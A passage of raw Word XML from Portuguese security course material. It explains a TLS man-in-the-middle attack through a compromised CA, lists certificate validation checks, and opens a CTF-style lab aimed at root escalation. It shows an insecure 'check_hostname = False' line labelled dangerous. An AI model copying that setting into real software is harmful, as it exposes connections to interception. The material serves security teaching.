          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>[proxy] ✓ Response modified (Bank32 -&gt; antixerox)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="94"/>
    </w:p>
    <w:p w14:paraId="1EE24E49" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
        <w:pageBreakBefore/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6AE21AD0" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="96" w:name="_Toc213874718"/>
      <w:bookmarkStart w:id="97" w:name="por-que-o-ataque-funciona"/>
      <w:bookmarkStart w:id="98" w:name="_Toc213881916"/>
      <w:r>
        <w:t>Por que o Ataque Funciona?</w:t>
      </w:r>
      <w:bookmarkEnd w:id="96"/>
      <w:bookmarkEnd w:id="98"/>
    </w:p>
    <w:p w14:paraId="7F2B84A9" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Compact"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>CA Comprometida</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">: Atacante tem </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>ca.key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="438D4533" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Compact"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Certificado Válido</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>: Proxy usa certificado assinado pela CA</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DA48E78" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Compact"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Browser Confia</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>: CA está na lista de confiáveis</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CFA5C5F" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Compact"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Hostname Match</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>: Certificado tem CN correto</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BB68CFE" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Compact"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>TLS Estabelecido</w:t>
      </w:r>
      <w:r>
        <w:t>: Cadeado verde aparece</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="654BB600" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Compact"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Vítima Não Suspeita</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>: Tudo parece legítimo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24921404" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo4"/>
      </w:pPr>
      <w:bookmarkStart w:id="99" w:name="o-que-tls-protege"/>
      <w:r>
        <w:t>O que TLS Protege</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13169427" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Compact"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Confidencialidade</w:t>
      </w:r>
      <w:r>
        <w:t>: Dados cifrados</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="643E6692" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Compact"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Integridade</w:t>
      </w:r>
      <w:r>
        <w:t>: Detecção de modificação</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48F1D70A" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Compact"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Autenticação</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>: Verificação de identidade (se PKI íntegra)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="99"/>
    </w:p>
    <w:p w14:paraId="00D378F9" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo4"/>
      </w:pPr>
      <w:bookmarkStart w:id="100" w:name="o-que-tls-não-protege"/>
      <w:r>
        <w:t>O que TLS NÃO Protege</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BD48FDE" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Compact"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>CA Compromise</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>: Todo o sistema é comprometido</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34A02652" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Compact"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Stolen Private Keys</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>: Atacante pode se passar por servidor</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EEAE197" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Compact"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Phishing</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>: Atacantes podem ter certificados válidos para domínios similares</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13DD5AD7" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Compact"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Malware no endpoint</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>: TLS protege em trânsito, não endpoints</w:t>
      </w:r>
      <w:bookmarkEnd w:id="97"/>
      <w:bookmarkEnd w:id="100"/>
    </w:p>
    <w:p w14:paraId="2DF29CAF" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="101" w:name="_Toc213874719"/>
      <w:bookmarkStart w:id="102" w:name="_Toc213881917"/>
      <w:r>
        <w:t>Importância do Hostname Check</w:t>
      </w:r>
      <w:bookmarkEnd w:id="101"/>
      <w:bookmarkEnd w:id="102"/>
    </w:p>
    <w:p w14:paraId="4F71B05A" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="FirstParagraph"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>NUNCA desabilitar</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>check_hostname</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5787512C" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="SourceCode"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentTok"/>
        </w:rPr>
        <w:t># PERIGOSO</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="NormalTok"/>
        </w:rPr>
        <w:t xml:space="preserve">context.check_hostname </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="OperatorTok"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="NormalTok"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VariableTok"/>
        </w:rPr>
        <w:t>False</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentTok"/>
        </w:rPr>
        <w:t># SEGURO</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="NormalTok"/>
        </w:rPr>
        <w:t xml:space="preserve">context.check_hostname </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="OperatorTok"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="NormalTok"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VariableTok"/>
        </w:rPr>
        <w:t>True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D41F513" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="FirstParagraph"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="103" w:name="importância-do-hostname-check-1"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Sem hostname check, qualquer certificado válido é aceite → MITM trivial.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="103"/>
    </w:p>
    <w:p w14:paraId="6663CFEA" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="104" w:name="_Toc213874720"/>
      <w:bookmarkStart w:id="105" w:name="verificação-de-certificados"/>
      <w:bookmarkStart w:id="106" w:name="_Toc213881918"/>
      <w:r>
        <w:t>Verificação de Certificados</w:t>
      </w:r>
      <w:bookmarkEnd w:id="104"/>
      <w:bookmarkEnd w:id="106"/>
    </w:p>
    <w:p w14:paraId="1E2C2125" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="FirstParagraph"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Um certificado deve ser validado em múltiplas dimensões:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E0059D1" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="SourceCode"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
        </w:rPr>
        <w:t>1. Assinatura válida? (CA check)</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
        </w:rPr>
        <w:t xml:space="preserve">2. CA confiável? </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(in /etc/ssl/certs)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">3. Hostname match? </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
        </w:rPr>
        <w:t>(CN/SAN == URL)</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
        </w:rPr>
        <w:t>4. Temporalmente válido? (notBefore &lt; now &lt; notAfter)</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
        </w:rPr>
        <w:t>5. Não revogado? (CRL/OCSP check)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E826472" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="FirstParagraph"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>TODOS</w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve"> os checks devem passar!</w:t>
      </w:r>
      <w:bookmarkEnd w:id="13"/>
      <w:bookmarkEnd w:id="70"/>
      <w:bookmarkEnd w:id="105"/>
    </w:p>
    <w:p w14:paraId="3B5421C3" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pageBreakBefore/>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="25A00019" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="063072C9" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0BB0493D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="04F64FD4" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="78612100" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="413BE48D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="31BBD043" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0D31686B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B7F8EB0" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2791CA29" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1F0540AB" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="107" w:name="_Toc213874721"/>
      <w:bookmarkStart w:id="108" w:name="_Toc213881919"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t>SeedLab: Anti-AntiXerox!</w:t>
      </w:r>
      <w:bookmarkEnd w:id="107"/>
      <w:bookmarkEnd w:id="108"/>
    </w:p>
    <w:p w14:paraId="278E9552" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pageBreakBefore/>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="24034348" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="109" w:name="_Toc213874722"/>
      <w:bookmarkStart w:id="110" w:name="_Toc213881920"/>
      <w:r>
        <w:t>Introdução</w:t>
      </w:r>
      <w:bookmarkEnd w:id="109"/>
      <w:bookmarkEnd w:id="110"/>
    </w:p>
    <w:p w14:paraId="2C38E87D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="1E3BDA41" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:firstLine="708"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Este laboratório explica, passo a passo, como usar o CyberChef para descriptografar dados e como combinar ferramentas Linux (e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:i/>
        </w:rPr>
        <w:t>hash-identifier</w:t>
      </w:r>
      <w:r>
        <w:t>) para analisar e identificar tipos de hash. O formato é um walkthrough prático onde tens acesso a uma máquina online: recebes artefatos, executas comandos no Linux e usas CyberChef para extrair informações.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7930B717" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>O objetivo final é escalar para root.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CECF87F" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve">Em cada passo há uma </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>riddle</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> que funciona como dica, podes clicar por cima da palavra e usar se achares necessário.</w:t>
      </w:r>
      <w:bookmarkStart w:id="111" w:name="_Hlk213873848"/>
    </w:p>
    <w:bookmarkEnd w:id="111"/>
    <w:p w14:paraId="0A0605D1" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="06723F56" wp14:editId="67F4858E">
                <wp:extent cx="5943600" cy="19046"/>
                <wp:effectExtent l="0" t="0" r="0" b="0"/>
                <wp:docPr id="708516304" name="Horizontal Line 26"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="5943600" cy="19046"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln cap="flat">
                          <a:noFill/>
                          <a:prstDash val="solid"/>
                        </a:ln>
                      </wps:spPr>
                      <wps:bodyPr lIns="0" tIns="0" rIns="0" bIns="0"/>
                    </wps:wsp>
                  </a:graphicData>
                </a:graphic>
              </wp:inline>
            </w:drawing>
          </mc:Choice>
          <mc:Fallback>
            <w:pict>
              <v:rect w14:anchorId="28A68AF7" id="Horizontal Line 26"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" filled="f" stroked="f">
                <v:textbox inset="0,0,0,0"/>
                <w10:anchorlock/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w14:paraId="2419E910" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="112" w:name="_Toc213874723"/>
      <w:bookmarkStart w:id="113" w:name="_Toc213881921"/>
      <w:r>
        <w:t>Objetivos</w:t>
      </w:r>
      <w:bookmarkEnd w:id="112"/>
      <w:bookmarkEnd w:id="113"/>
    </w:p>
    <w:p w14:paraId="110EBEE4" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Aprender os princípios básicos do CyberChef (receitas, encadeamento de operações, pré-visualização).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DBDED84" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Identificar formatos com ferramentas Linux (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        </w:rPr>
        <w:t>file</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        </w:rPr>
        <w:t>xxd</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        </w:rPr>
        <w:t>hexdump</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        </w:rPr>
        <w:t>strings</w:t>
      </w:r>
      <w:r>
        <w:t>) e confirmar com CyberChef.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A4DE619" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Usar </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        </w:rPr>
        <w:t>hash-identifier</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> para identificar tipos de hash e explorar opções de cracking/validação básicas.</w:t>
      </w:r>
    </w:p>
